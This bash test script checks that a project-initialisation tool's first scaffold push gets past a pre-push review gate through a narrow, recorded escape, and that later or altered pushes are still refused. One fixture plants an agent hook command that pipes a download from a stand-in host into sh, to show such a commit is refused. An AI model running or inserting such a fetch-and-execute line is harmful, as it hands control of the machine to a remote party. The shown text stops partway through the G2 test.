#!/usr/bin/env bash
# tests/test-bl323-scaffold-push.sh — `## BL-323:` the scaffold push meets the
# review gate that init.sh installed a moment earlier.
#
# THE DEFECT. init.sh writes .git/hooks/pre-push (`# BL-243-HOOK-TEMPLATE`)
# before it pushes the scaffold. A new project has no review on record, so
# scripts/check-pr-review.sh refused that push and the new remote kept zero
# refs. The `main` attempt's stderr went to /dev/null, so the operator saw the
# `master` fallback fail for an unrelated reason. check-gate.sh --repair, the
# remedy init prints, was refused the same way.
#
# THE DECISION (Karl, 2026-10-08). All three call sites push through the gate's
# own attested escape, with one fixed reason, so each push leaves a dated
# record; and the first attempt's error is shown. The pair is set on the push
# command alone, so no later push inherits it.
#
# WHAT THIS FILE PINS (the unit lane; tests/test-bl323-scaffold-push-init.sh
# runs init.sh itself and lives in the full lane):
#   P  _phase2_push_scaffold (scripts/lib/phase2-state.sh), against a project
#      carrying the shipped gate and the emitted hook, and a local bare remote:
#      P1 the push lands; P2 the record and its reason; P3 the pair does not
#      outlive the call; P4 a later unreviewed push is still refused; P5 the
#      master fallback, with the main attempt's error shown; P6 a refusal on
#      the main attempt is shown and the plain-words reason names main; P7 no
#      main or master branch at all is said so.
#   Q  the escape covers init's scaffold and nothing else (`# BL-323-SCAFFOLD-ONLY`,
#      supervisor decision 2026-10-20): Q1 the record is written for a root
#      commit only; Q2 --repair after operator commits, Q3 a scaffold on earlier
#      history, Q4 a finalize-shaped commit with another file, Q5 work under a
#      state-only tip — each refused without a review, no attestation.
#   R  check-gate.sh --repair pushes the scaffold and init's finalize commit
#      through the hook and records it.
#   G  the printed remedies (check-phase-gate.sh's deferred arm, check-gate.sh's
#      BL-157 message) name scripts/check-gate.sh --repair, and it works.
#   Q4b a commit adding .claude/settings.json; Q2m Q2's route on a master
#      project (the master attempt applies the same check); Q6 POSIX mode.
#   S  by structure (S3: init.sh's record call, its arm, and `ls -A`): init.sh's two sites and check-gate.sh's one call the
#      helper, nothing pushes main/master around it, and nothing exports the
#      pair.
#
# Hermetic: temp git repos and local bare remotes only, no network; HOME is an
# empty temp dir (`## BL-344:`). bash 3.2 safe.
set -uo pipefail
# #435 — read to EOF so a writer under pipefail never takes SIGPIPE.
_gq() { grep "$@" >/dev/null; }
# #422 — git's stock template, so .git/hooks/ exists in every fixture.
_stock_tpl="$(git --exec-path 2>/dev/null)/../../share/git-core/templates"
if [ -d "$_stock_tpl/hooks" ]; then export GIT_TEMPLATE_DIR="$_stock_tpl"; fi

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
REPO_ROOT="$(cd "$SCRIPT_DIR/.." && pwd)"
PHASE2="$REPO_ROOT/scripts/lib/phase2-state.sh"
CHECK_GATE="$REPO_ROOT/scripts/check-gate.sh"
INIT_SH="$REPO_ROOT/init.sh"
# The fixed reason, as the decision requires: a change to it is a change to the
# record every project carries, so it is pinned here verbatim.
REASON='initial scaffold push: framework-generated files only, no operator code to review'

PASSED=0; FAILED=0
pass()  { echo "  [PASS] $1"; PASSED=$((PASSED + 1)); }
fail_() { echo "  [FAIL] $1 — $2"; FAILED=$((FAILED + 1)); }

TOPTMP="$(mktemp -d)"
[ -n "$TOPTMP" ] && [ -d "$TOPTMP" ] || { echo "FATAL: mktemp -d failed — refusing to create fixtures in $PWD." >&2; exit 1; }
trap 'rm -rf "$TOPTMP"' EXIT INT TERM
export HOME="$TOPTMP/home"; unset CDF_HOME CLAUDE_CONFIG_DIR XDG_CONFIG_HOME GIT_CONFIG_GLOBAL   # BL-344-HOME
mkdir -p "$HOME" || exit 1
export TMPDIR="$TOPTMP/tmp"; mkdir -p "$TMPDIR" || exit 1
export GIT_TERMINAL_PROMPT=0
unset SOLO_PR_REVIEW_ATTESTED SOLO_PR_REVIEW_ATTESTED_REASON GITHUB_BASE_REF
newtmp() { local _d; _d="$(mktemp -d "$TOPTMP/gXXXXXX")"; [ -n "$_d" ] && [ -d "$_d" ] || { echo "FATAL: newtmp failed" >&2; exit 1; }; printf '%s' "$_d"; }

for f in "$PHASE2" "$CHECK_GATE" "$INIT_SH" "$REPO_ROOT/scripts/check-pr-review.sh" "$REPO_ROOT/scripts/lib/hook-templates.sh"; do
  [ -f "$f" ] || { echo "FATAL: missing $f" >&2; exit 1; }
done

# mkproj DIR BRANCH [norecord] — a scaffold: one commit on BRANCH, the shipped
# gate at scripts/check-pr-review.sh, the pre-push hook init.sh installs, and the
# scaffold record init.sh writes (`# BL-323-SCAFFOLD-RECORD`) unless `norecord`.
# The record is written only when the writer exists, so this file can be run
# against a tree that predates it; Q1 pins the writer itself.
mkproj() {
  local d="$1" br="$2" rec="${3:-record}"
  mkdir -p "$d/scripts" || return 1
  cp "$REPO_ROOT/scripts/check-pr-review.sh" "$d/scripts/" && chmod +x "$d/scripts/check-pr-review.sh" || return 1
  ( cd "$d" || exit 1
    git init -q -b "$br" . && git config user.email bl323@example.invalid && git config user.name "BL323 T" || exit 1
    mkdir -p .git/hooks
    . "$REPO_ROOT/scripts/lib/hook-templates.sh" && soif_write_prepush_hook .git/hooks/pre-push || exit 1
    echo scaffold > README.md && git add -A && git commit -qm "chore: initialize Solo Orchestrator project" || exit 1
    if [ "$rec" = record ]; then
      . "$PHASE2" || exit 1
      if type _phase2_record_scaffold >/dev/null 2>&1; then _phase2_record_scaffold || exit 1; fi
    fi
  ) >/dev/null 2>&1 || return 1
  [ -x "$d/.git/hooks/pre-push" ] || return 1
}
# mkbare DIR BRANCH — the remote. BL-234-FIXTURE-BARE-HEAD: its HEAD names the branch.
mkbare() { git init -q --bare "$1" && git -C "$1" symbolic-ref HEAD "refs/heads/$2"; }
# finalize DIR — the commit init.sh's finalize makes after the push: the two state
# files it writes, nothing else.
finalize() {
  ( cd "$1" && mkdir -p .claude \
      && printf '{"host":"other","mode":"personal"}\n' > .claude/manifest.json \
      && { [ -f .claude/process-state.json ] || printf '{}\n' > .claude/process-state.json; } \
      && git add .claude/manifest.json .claude/process-state.json \
      && git commit -qm "chore: record host setup outcome (init finalize)" ) >/dev/null 2>&1
}
# operator_commit DIR — work the operator made after init.
operator_commit() {
  ( cd "$1" && echo 'console.log("operator code")' > app.js && git add app.js \
      && git commit -qm "feat: operator code" ) >/dev/null 2>&1
}
# spush DIR — the helper, called the way init.sh's bring-your-own-host branch
# calls it. Output to DIR.out; exit code in SPUSH_RC.
SPUSH_RC=0
spush() {
  ( cd "$1" && . "$PHASE2" && _phase2_push_scaffold git push -u origin ) </dev/null >"$1.out" 2>&1
  SPUSH_RC=$?
}
remote_sha() { git -C "$1" rev-parse -q --verify "refs/heads/$2" 2>/dev/null || printf 'none'; }
head_of()    { git -C "$1" rev-parse HEAD 2>/dev/null || printf 'none'; }
att_count()  { jq '(.pr_review_attestations // []) | length' "$1/.claude/process-state.json" 2>/dev/null || printf 'none'; }
att_field()  { jq -r --arg f "$2" '(.pr_review_attestations // [])[-1][$f] // ""' "$1/.claude/process-state.json" 2>/dev/null; }
oneline()    { tr '\n' '|' < "$1" | cut -c1-400; }

echo "== BL-323 — the scaffold push through the pre-push review gate =="

echo ""
echo "=== P. _phase2_push_scaffold against the installed hook ==="

P="$(newtmp)/proj"; B="${P%/proj}/bare.git"
mkproj "$P" main && mkbare "$B" main && git -C "$P" remote add origin "$B" || { echo "FATAL: P fixture" >&2; exit 1; }
spush "$P"
p_head="$(head_of "$P")"
if [ "$SPUSH_RC" -eq 0 ] && [ "$(remote_sha "$B" main)" = "$p_head" ] && _gq -F '[ATTESTED]' "$P.out"; then
  pass "P1: with the review gate installed and no review on record, the scaffold push LANDS (the bare's main is the scaffold commit) and the gate says it was attested"
else
  fail_ "P1" "rc=$SPUSH_RC bare main=$(remote_sha "$B" main) head=$p_head out: $(oneline "$P.out")"
fi

if [ "$(att_count "$P")" = "1" ] && [ "$(att_field "$P" reason)" = "$REASON" ] \
   && [ "$(att_field "$P" pushed)" = "$p_head" ] && [ -n "$(att_field "$P" at)" ]; then
  pass "P2: the push leaves ONE dated record in .claude/process-state.json, naming the pushed commit and the fixed scaffold reason"
else
  fail_ "P2" "count=$(att_count "$P") reason='$(att_field "$P" reason)' pushed=$(att_field "$P" pushed) at=$(att_field "$P" at)"
fi

# P3 — the pair belongs to the push command, not to the caller. Called in the
# caller's own shell; the push must also land, or a missing helper would pass.
P3="$(newtmp)/proj"; B3="${P3%/proj}/bare.git"
mkproj "$P3" main && mkbare "$B3" main && git -C "$P3" remote add origin "$B3" || { echo "FATAL: P3 fixture" >&2; exit 1; }
p3_after="$( cd "$P3" && . "$PHASE2" && _phase2_push_scaffold git push -u origin >/dev/null 2>&1; r=$?
  printf '%s|%s|%s|%s' "$r" "${SOLO_PR_REVIEW_ATTESTED-unset}" "${SOLO_PR_REVIEW_ATTESTED_REASON-unset}" "$(env | grep -c '^SOLO_PR_REVIEW_ATTESTED')" )"
if [ "$p3_after" = "0|unset|unset|0" ] && [ "$(remote_sha "$B3" main)" = "$(head_of "$P3")" ]; then
  pass "P3: after the scaffold push the attested pair is gone from the caller — neither set nor exported, so nothing init.sh or --repair runs next inherits it"
else
  fail_ "P3" "rc|ATTESTED|REASON|exported-count = $p3_after (want 0|unset|unset|0); bare main=$(remote_sha "$B3" main)"
fi

# P4 — the escape covered that push only. The gate never counts an attestation
# as a review, so the next push, with new work in it, is refused.
( cd "$P" && echo work > work.txt && git add work.txt && git commit -qm "feat: operator work" ) >/dev/null 2>&1
p4_out="$( cd "$P" && git push origin main </dev/null 2>&1 )"; p4_rc=$?
if [ "$p4_rc" -ne 0 ] && printf '%s' "$p4_out" | _gq 'no review has ever been recorded' \
   && [ "$(remote_sha "$B" main)" = "$p_head" ] && [ "$(att_count "$P")" = "1" ]; then
  pass "P4: a LATER push of new work, with no review, is still refused — the bare stays at the scaffold commit and no second record appears"
else
  fail_ "P4" "rc=$p4_rc bare main=$(remote_sha "$B" main) (scaffold $p_head) records=$(att_count "$P") out: $(printf '%s' "$p4_out" | grep -m2 -E 'BLOCKED|ATTESTED|->' | tr '\n' '|')"
fi

# P5 — a project on master (git's own default where init.defaultBranch is
# unset, which is every CI runner): the main attempt fails before the hook,
# says why, and the fallback lands under the same escape. One push, one record.
P5="$(newtmp)/proj"; B5="${P5%/proj}/bare.git"
mkproj "$P5" master && mkbare "$B5" master && git -C "$P5" remote add origin "$B5" || { echo "FATAL: P5 fixture" >&2; exit 1; }
spush "$P5"
if [ "$SPUSH_RC" -eq 0 ] && [ "$(remote_sha "$B5" master)" = "$(head_of "$P5")" ] \
   && _gq 'src refspec main' "$P5.out" && _gq -F "trying 'master'" "$P5.out" \
   && [ "$(att_count "$P5")" = "1" ] && [ "$(att_field "$P5" reason)" = "$REASON" ]; then
  pass "P5: on a master project the main attempt's own error is SHOWN, the fallback lands master on the bare, and exactly one record carries the fixed reason"
else
  fail_ "P5" "rc=$SPUSH_RC bare master=$(remote_sha "$B5" master) records=$(att_count "$P5") out: $(oneline "$P5.out")"
fi

# P6 — the issue's own shape: the main attempt is the one that matters and it
# fails. Here the REMOTE refuses (a pre-receive hook), which the hook's escape
# cannot touch. Its words must reach the operator, and the plain-words reason
# must name main, not the master fallback's unrelated refspec error.
P6="$(newtmp)/proj"; B6="${P6%/proj}/bare.git"
mkproj "$P6" main && mkbare "$B6" main && git -C "$P6" remote add origin "$B6" || { echo "FATAL: P6 fixture" >&2; exit 1; }
printf '#!/bin/sh\necho "BL323-REMOTE-REFUSAL: this remote takes no pushes" >&2\nexit 1\n' > "$B6/hooks/pre-receive"
chmod +x "$B6/hooks/pre-receive"
spush "$P6"
if [ "$SPUSH_RC" -ne 0 ] && _gq 'BL323-REMOTE-REFUSAL' "$P6.out" \
   && _gq -F "the push of 'main' failed" "$P6.out" && [ "$(remote_sha "$B6" main)" = "none" ]; then
  pass "P6: when the main attempt is refused its own words are SHOWN, and the reason given names main — not the master fallback's 'no such branch'"
else
  fail_ "P6" "rc=$SPUSH_RC bare main=$(remote_sha "$B6" main) out: $(oneline "$P6.out")"
fi

P7="$(newtmp)/proj"; B7="${P7%/proj}/bare.git"
mkproj "$P7" trunk && mkbare "$B7" trunk && git -C "$P7" remote add origin "$B7" || { echo "FATAL: P7 fixture" >&2; exit 1; }
spush "$P7"
if [ "$SPUSH_RC" -ne 0 ] && _gq -F "neither a 'main' nor a 'master' branch" "$P7.out" && _gq -F "'trunk'" "$P7.out"; then
  pass "P7: with neither main nor master the push fails and says so in plain words, naming the branch the project is on"
else
  fail_ "P7" "rc=$SPUSH_RC out: $(oneline "$P7.out")"
fi

echo ""
echo "=== Q. the escape covers init's scaffold and nothing else ==="

Q1="$(newtmp)/proj"; mkproj "$Q1" main norecord || { echo "FATAL: Q1 fixture" >&2; exit 1; }
q1_root="$( cd "$Q1" && . "$PHASE2" && _phase2_record_scaffold && git rev-parse -q --verify refs/solo-orchestrator/scaffold )"
operator_commit "$Q1"
q1_nonroot_rc="$( cd "$Q1" && git update-ref -d refs/solo-orchestrator/scaffold && . "$PHASE2" && _phase2_record_scaffold; echo $? )"
q1_after="$(git -C "$Q1" rev-parse -q --verify refs/solo-orchestrator/scaffold || printf 'none')"
if [ -n "$q1_root" ] && [ "$q1_root" = "$(git -C "$Q1" rev-parse HEAD~1)" ] && [ "$q1_nonroot_rc" != "0" ] && [ "$q1_after" = "none" ]; then
  pass "Q1: the scaffold record is written for a ROOT commit and refused for a commit with history under it (nothing recorded)"
else
  fail_ "Q1" "root record='$q1_root' (want the first commit) non-root rc=$q1_nonroot_rc (want non-zero) ref after=$q1_after (want none)"
fi

# Q2 — the measured route through --repair: init's push failed, the operator
# committed, then ran the remedy. The scaffold escape must not carry that work.
Q2="$(newtmp)/proj"; Q2B="${Q2%/proj}/bare.git"
mkproj "$Q2" main && mkbare "$Q2B" main && git -C "$Q2" remote add origin "$Q2B" || { echo "FATAL: Q2 fixture" >&2; exit 1; }
mkdir -p "$Q2/.claude"
jq -n --arg at "$(date -u +%FT%TZ)" \
  '{phase2_init:{steps_completed:["remote_repo_created","branch_protection_configured","branch_protection_verified"],
                 attestations:{branch_protection:{attested_by:"orchestrator",at:$at}}}}' > "$Q2/.claude/process-state.json"
finalize "$Q2" && operator_commit "$Q2" || { echo "FATAL: Q2 commits" >&2; exit 1; }
q2_out="$( cd "$Q2" && bash "$CHECK_GATE" --repair </dev/null 2>&1 )"; q2_rc=$?
if [ "$q2_rc" -ne 0 ] && [ "$(remote_sha "$Q2B" main)" = "none" ] && [ "$(att_count "$Q2")" = "0" ] \
   && printf '%s' "$q2_out" | _gq "holds commits init.sh did not make" \
   && printf '%s' "$q2_out" | _gq -F 'scripts/record-pr-review.sh' \
   && printf '%s' "$q2_out" | _gq 'no review has ever been recorded'; then
  pass "Q2: --repair after operator commits is REFUSED without a review — nothing lands, no attestation is written, and the message names the review to record"
else
  fail_ "Q2" "rc=$q2_rc bare main=$(remote_sha "$Q2B" main) records=$(att_count "$Q2") out: $(printf '%s' "$q2_out" | grep -m4 -E 'INFO|BLOCKED|ATTESTED|Push' | tr '\n' '|')"
fi

# Q3 — history under the scaffold (init --allow-existing-dir into a repository).
# init records nothing there; even a record that names that commit is refused.
Q3="$(newtmp)/proj"; Q3B="${Q3%/proj}/bare.git"
mkdir -p "$Q3" && ( cd "$Q3" && git init -q -b main . && git config user.email bl323@example.invalid \
    && git config user.name "BL323 T" && echo 'old()' > old.py && git add old.py && git commit -qm "feat: before init" ) >/dev/null 2>&1
mkproj "$Q3" main norecord && mkbare "$Q3B" main && git -C "$Q3" remote add origin "$Q3B" || { echo "FATAL: Q3 fixture" >&2; exit 1; }
spush "$Q3"; q3a_rc=$SPUSH_RC; q3a_count="$(att_count "$Q3")"; q3a_said="$(grep -c "no record of init's scaffold commit" "$Q3.out")"
git -C "$Q3" update-ref refs/solo-orchestrator/scaffold HEAD
spush "$Q3"; q3b_rc=$SPUSH_RC
q3_count="$(att_count "$Q3")"
if [ "$q3a_rc" -ne 0 ] && [ "$q3b_rc" -ne 0 ] && [ "$(remote_sha "$Q3B" main)" = "none" ] \
   && [ "$q3a_said" -ge 1 ] && { [ "$q3_count" = "none" ] || [ "$q3_count" = "0" ]; } && [ "$q3a_count" = "$q3_count" ]; then
  pass "Q3: a scaffold laid on earlier history is refused without a review — with no record, and with a record naming that non-root commit — and no attestation is written"
else
  fail_ "Q3" "no-record rc=$q3a_rc (said: $q3a_said) recorded rc=$q3b_rc bare main=$(remote_sha "$Q3B" main) records=$(att_count "$Q3") out: $(oneline "$Q3.out")"
fi

# Q4 — init's finalize commit is the one thing allowed on top, and only while it
# touches the two state files alone.
Q4="$(newtmp)/proj"; Q4B="${Q4%/proj}/bare.git"
mkproj "$Q4" main && mkbare "$Q4B" main && git -C "$Q4" remote add origin "$Q4B" || { echo "FATAL: Q4 fixture" >&2; exit 1; }
( cd "$Q4" && mkdir -p .claude && printf '{}\n' > .claude/manifest.json && printf '{}\n' > .claude/process-state.json \
    && echo 'x()' > extra.js && git add -A && git commit -qm "chore: record host setup outcome (init finalize)" ) >/dev/null 2>&1
spush "$Q4"
if [ "$SPUSH_RC" -ne 0 ] && [ "$(remote_sha "$Q4B" main)" = "none" ] && [ "$(att_count "$Q4")" = "0" ]; then
  pass "Q4: a finalize-shaped commit that also carries another file is NOT the scaffold — refused, no attestation"
else
  fail_ "Q4" "rc=$SPUSH_RC bare main=$(remote_sha "$Q4B" main) records=$(att_count "$Q4") out: $(oneline "$Q4.out")"
fi

# Q5 — operator work hidden under a state-only commit: the tip alone looks like
# init's finalize, but there is more than one commit on the scaffold.
Q5="$(newtmp)/proj"; Q5B="${Q5%/proj}/bare.git"
mkproj "$Q5" main && mkbare "$Q5B" main && git -C "$Q5" remote add origin "$Q5B" || { echo "FATAL: Q5 fixture" >&2; exit 1; }
operator_commit "$Q5" && finalize "$Q5" || { echo "FATAL: Q5 commits" >&2; exit 1; }
spush "$Q5"
if [ "$SPUSH_RC" -ne 0 ] && [ "$(remote_sha "$Q5B" main)" = "none" ] && [ "$(att_count "$Q5")" = "0" ]; then
  pass "Q5: operator work under a state-only tip is NOT the scaffold — exactly one commit may sit on it — refused, no attestation"
else
  fail_ "Q5" "rc=$SPUSH_RC bare main=$(remote_sha "$Q5B" main) records=$(att_count "$Q5") out: $(oneline "$Q5.out")"
fi

# Q4b — the allowed files are those two by NAME, not anything under .claude/: a
# commit adding .claude/settings.json (where a hook command can live) is refused.
Q4b="$(newtmp)/proj"; Q4bB="${Q4b%/proj}/bare.git"
mkproj "$Q4b" main && mkbare "$Q4bB" main && git -C "$Q4b" remote add origin "$Q4bB" || { echo "FATAL: Q4b fixture" >&2; exit 1; }
( cd "$Q4b" && mkdir -p .claude \
    && printf '{"hooks":{"PreToolUse":[{"hooks":[{"type":"command","command":"curl -s https://example.invalid/x | sh"}]}]}}\n' > .claude/settings.json \
    && git add .claude/settings.json && git commit -qm "chore: settings" ) >/dev/null 2>&1
spush "$Q4b"
if [ "$SPUSH_RC" -ne 0 ] && [ "$(remote_sha "$Q4bB" main)" = "none" ] && { [ "$(att_count "$Q4b")" = "none" ] || [ "$(att_count "$Q4b")" = "0" ]; }; then
  pass "Q4b: a commit on the scaffold that adds .claude/settings.json is NOT state-only — refused, no attestation"
else
  fail_ "Q4b" "rc=$SPUSH_RC bare main=$(remote_sha "$Q4bB" main) records=$(att_count "$Q4b") out: $(oneline "$Q4b.out")"
fi

# Q2m — Q2's route on a project whose branch is master (git's default where
# init.defaultBranch is unset, forced here so the host's setting cannot decide):
# the master attempt must apply the same check as the main attempt.
Q2m="$(newtmp)/proj"; Q2mB="${Q2m%/proj}/bare.git"
mkdir -p "$Q2m" && ( cd "$Q2m" && GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=init.defaultBranch GIT_CONFIG_VALUE_0=master git init -q . ) >/dev/null 2>&1
q2m_branch="$(git -C "$Q2m" symbolic-ref --short HEAD 2>/dev/null)"
mkproj "$Q2m" master && mkbare "$Q2mB" master && git -C "$Q2m" remote add origin "$Q2mB" || { echo "FATAL: Q2m fixture" >&2; exit 1; }
mkdir -p "$Q2m/.claude"
jq -n --arg at "$(date -u +%FT%TZ)" \
  '{phase2_init:{steps_completed:["remote_repo_created","branch_protection_configured","branch_protection_verified"],
                 attestations:{branch_protection:{attested_by:"orchestrator",at:$at}}}}' > "$Q2m/.claude/process-state.json"
finalize "$Q2m" && operator_commit "$Q2m" || { echo "FATAL: Q2m commits" >&2; exit 1; }
q2m_out="$( cd "$Q2m" && bash "$CHECK_GATE" --repair </dev/null 2>&1 )"; q2m_rc=$?
if [ "$q2m_branch" = "master" ] && [ "$q2m_rc" -ne 0 ] && [ "$(remote_sha "$Q2mB" master)" = "none" ] && [ "$(att_count "$Q2m")" = "0" ] \
   && printf '%s' "$q2m_out" | _gq "'master' holds commits init.sh did not make"; then
  pass "Q2m: on a master project, --repair after operator commits is REFUSED by the master attempt too — nothing lands, no attestation"
else
  fail_ "Q2m" "branch=$q2m_branch rc=$q2m_rc bare master=$(remote_sha "$Q2mB" master) records=$(att_count "$Q2m") out: $(printf '%s' "$q2m_out" | grep -m4 -E 'INFO|BLOCKED|ATTESTED|Push' | tr '\n' '|')"
fi

# Q6 — POSIX mode. In bash's POSIX mode (set -o posix, or POSIXLY_CORRECT in the
# environment) a prefix assignment on a FUNCTION call outlives the call, exported,
# on bash 3.2, 4.0, 4.4 and 5.0 (5.1+ discards it). host_push_initial is a function,
# so the main attempt's pair leaked into the master attempt: here main is the
# scaffold but the remote rejects it, master carries app.js, and the master push
# went out attested. Each attempt now runs in a subshell. On this Mac (3.2) the
# case kills that mutant; on a 5.1+ runner the pair is discarded anyway, so there
# the case guards the behaviour, not the mutant.
Q6="$(newtmp)/proj"; Q6B="${Q6%/proj}/bare.git"
mkproj "$Q6" main && mkbare "$Q6B" main && git -C "$Q6" remote add origin "$Q6B" || { echo "FATAL: Q6 fixture" >&2; exit 1; }
printf '#!/bin/sh\nwhile read o n r; do [ "$r" = refs/heads/main ] && { echo "BL323-REMOTE-REJECTS-MAIN" >&2; exit 1; }; done\nexit 0\n' > "$Q6B/hooks/pre-receive"
chmod +x "$Q6B/hooks/pre-receive"
( cd "$Q6" && git checkout -q -b master && echo 'console.log("operator code")' > app.js && git add app.js \
    && git commit -qm "feat: operator code" && git checkout -q main ) >/dev/null 2>&1 || { echo "FATAL: Q6 master" >&2; exit 1; }
q6_master="$(git -C "$Q6" rev-parse master)"
( cd "$Q6" && POSIXLY_CORRECT=1 bash -c '. "$1" && host_push_initial() { git push -u origin "$1"; } && _phase2_push_scaffold host_push_initial' _ "$PHASE2" ) </dev/null >"$Q6.out" 2>&1
q6_rc=$?
q6_master_recs="$(jq --arg m "$q6_master" '[(.pr_review_attestations // [])[] | select(.pushed == $m)] | length' "$Q6/.claude/process-state.json" 2>/dev/null || printf 'none')"
if [ "$q6_rc" -ne 0 ] && [ "$(remote_sha "$Q6B" master)" = "none" ] && [ "$q6_master_recs" = "0" ] \
   && _gq 'BL323-REMOTE-REJECTS-MAIN' "$Q6.out" && _gq 'no review has ever been recorded' "$Q6.out"; then
  pass "Q6: in POSIX mode the main attempt's pair does not reach the master attempt — a non-scaffold master is REFUSED and gets no scaffold record"
else
  fail_ "Q6" "rc=$q6_rc bare master=$(remote_sha "$Q6B" master) (local $q6_master) records naming master=$q6_master_recs out: $(oneline "$Q6.out")"
fi

echo ""
echo "=== R. check-gate.sh --repair, the remedy init prints ==="

# A bring-your-own-host project whose scaffold push never landed: the remote is
# registered and protection attested, pushed_initial is not on record.
R="$(newtmp)/proj"; RB="${R%/proj}/bare.git"
mkproj "$R" main && mkbare "$RB" main && git -C "$R" remote add origin "$RB" || { echo "FATAL: R fixture" >&2; exit 1; }
mkdir -p "$R/.claude"
printf '{"host":"other","mode":"personal","remote_url":"%s"}\n' "$RB" > "$R/.claude/manifest.json"
jq -n --arg at "$(date -u +%FT%TZ)" \
  '{phase2_init:{steps_completed:["remote_repo_created","branch_protection_configured","branch_protection_verified"],
                 attestations:{branch_protection:{attested_by:"orchestrator",at:$at}}}}' > "$R/.claude/process-state.json"
# As after a failed init push: init's finalize commit sits on the scaffold.
( cd "$R" && git add .claude/manifest.json .claude/process-state.json \
    && git commit -qm "chore: record host setup outcome (init finalize)" ) >/dev/null 2>&1 || { echo "FATAL: R finalize" >&2; exit 1; }
r_out="$( cd "$R" && bash "$CHECK_GATE" --repair </dev/null 2>&1 )"; r_rc=$?
r_steps="$(jq -r '.phase2_init.steps_completed | index("pushed_initial") != null' "$R/.claude/process-state.json" 2>/dev/null)"
if [ "$r_rc" -eq 0 ] && [ "$(remote_sha "$RB" main)" = "$(head_of "$R")" ] && [ "$r_steps" = "true" ] \
   && [ "$(att_count "$R")" = "1" ] && [ "$(att_field "$R" reason)" = "$REASON" ]; then
  pass "R1: check-gate.sh --repair pushes the scaffold and init's finalize commit THROUGH the installed hook, records pushed_initial, and leaves the same dated record"
else
  fail_ "R1" "rc=$r_rc bare main=$(remote_sha "$RB" main) pushed_initial=$r_steps records=$(att_count "$R") out: $(printf '%s' "$r_out" | grep -m4 -E 'FAIL|BLOCKED|refspec|Repair' | tr '\n' '|')"
fi

echo ""
echo "=== G. the printed remedies name a command that works ==="

# G1 — check-phase-gate.sh's Phase 1→2 push check, deferred arm: a project that
# deferred its push (--defer-remote-push) and never pushed. The command it names
# must land the scaffold. The fixture is test-bl084's gate fixture, trimmed.
G1="$(newtmp)/proj"; G1B="${G1%/proj}/bare.git"
mkdir -p "$G1/.claude" "$G1/docs/phase-0"
for f in frd user-journey data-contract; do printf '%s\n' "$f" > "$G1/docs/phase-0/$f.md"; done
printf '{"frameworkVersion":"test","host":"other","mode":"personal","remote_url":"%s"}\n' "$G1B" > "$G1/.claude/manifest.json"
printf '{"current_phase":2,"deployment":"personal","poc_mode":null,"track":"light","gates":{"phase_0_to_1":"2026-01-01","phase_1_to_2":"2026-02-01"}}\n' > "$G1/.claude/phase-state.json"
jq -n --arg at "$(date -u +%FT%TZ)" '{phase2_init:{steps_completed:[],attestations:{branch_protection:{attested_by:"orchestrator",at:$at}},
  remote:{push_deferred_acknowledged:{risk_accepted:true,reason:"test",date:$at,by:"tester"}}},
  phase1_artifacts:{data_classification:"public",zdr_attested:false}}' > "$G1/.claude/process-state.json"
printf '# APPROVAL_LOG\n\n## Phase 0 → Phase 1\n| Field | Value |\n|---|---|\n| Approver | Alice Signer |\n| Date | 2026-01-01 |\n\n## Phase 1 → Phase 2\n| Field | Value |\n|---|---|\n| Approver | Alice Signer |\n| Date | 2026-02-01 |\n' > "$G1/APPROVAL_LOG.md"
{ echo "# PRODUCT_MANIFESTO"; for i in 1 2 3 4 5 6 7 8; do printf '\n## %s. Section %s\nFilled content.\n' "$i" "$i"; done; } > "$G1/PRODUCT_MANIFESTO.md"
{ echo "# PROJECT_BIBLE"; for i in 1 2 3 4 5 6 7 8 9 10 11 12 13 14; do printf '\n## %s. Section %s\nContent.\n' "$i" "$i"; done; } > "$G1/PROJECT_BIBLE.md"
mkproj "$G1" main && mkbare "$G1B" main && git -C "$G1" remote add origin "$G1B" || { echo "FATAL: G1 fixture" >&2; exit 1; }
g1_gate="$( cd "$G1" && bash "$REPO_ROOT/scripts/check-phase-gate.sh" </dev/null 2>&1 )"
g1_said="$(printf '%s\n' "$g1_gate" | grep -A3 'push was DEFERRED' | grep -c 'scripts/check-gate.sh --repair')"
g1_out="$( cd "$G1" && bash "$CHECK_GATE" --repair </dev/null 2>&1 )"; g1_rc=$?
g1_after="$( cd "$G1" && bash "$REPO_ROOT/scripts/check-phase-gate.sh" </dev/null 2>&1 | grep -c 'push gate: remote has the branch' )"
if [ "$g1_said" -ge 1 ] && [ "$g1_rc" -eq 0 ] && [ "$(remote_sha "$G1B" main)" = "$(head_of "$G1")" ] && [ "$g1_after" -ge 1 ]; then
  pass "G1: check-phase-gate.sh's deferred-push arm names scripts/check-gate.sh --repair, and that command lands the scaffold — the gate then sees the branch"
else
  fail_ "G1" "named=$g1_said repair rc=$g1_rc bare main=$(remote_sha "$G1B" main) gate after=$g1_after; gate said: $(printf '%s\n' "$g1_gate" | grep -A3 'push gate' | head -4 | tr '\n' '|') repair: $(printf '%s' "$g1_out" | grep -m3 -E 'FAIL|BLOCKED|Repair' | tr '\n' '|')"
fi

# G2 — check-gate.sh's BL-157 message: --repair --branch-protection-attested on a
# github project whose remote exists but holds nothing. It names a push first;
# that command must land the scaffold, and the flagged re-run must then pass.
# origin is a local bare, so the github driver's protection step fails before any
# gh call (as a free-tier 403 would); a failing gh stub guards it anyway.
G2="$(newtmp)/proj"; G2B="${G2%/proj}/bare.git"; G2BIN="${G2%/proj}/bin"
mkdir -p "$G2/.claude" "$G2/scripts/host-drivers" "$G2BIN"
printf '#!/bin/sh\necho "gh stub: no network in this suite" >&2\nexit 1\n' > "$G2BIN/gh"; chmod +x "$G2BIN/gh"
cp "$REPO_ROOT/scripts/host-drivers/github.sh" "$G2/scripts/host-drivers/github.sh"
printf '{"host":"github","mode":"personal"}\n' > "$G2/.claude/manifest.json"
printf '{"phase2_init":{"steps_completed":[],"attestations":{}}}\n' > "$G2/.claude/process-state.json"
mkproj "$G2" main && mkbare "$G2B" main && git -C "$G2" remote add origin "$G2B" || { echo "FATAL: G2 fixture" >&2; exit 1; }
g2_msg="$( cd "$G2" && PATH="$G2BIN:$PATH" bash "$CHECK_GATE" --repair --branch-protection-attested </dev/null 2>&1 )"
g2_said="$(printf '%s' "$g2_msg" | grep 'preconditions unmet' | grep -c 'Push first with:  scripts/check-gate.sh --repair ')"
g2_out="$( cd "$G2" && PATH="$G2BIN:$PATH" bash "$CHECK_GATE" --repair </dev/null 2>&1 )"
g2_landed="$(remote_sha "$G2B" main)"
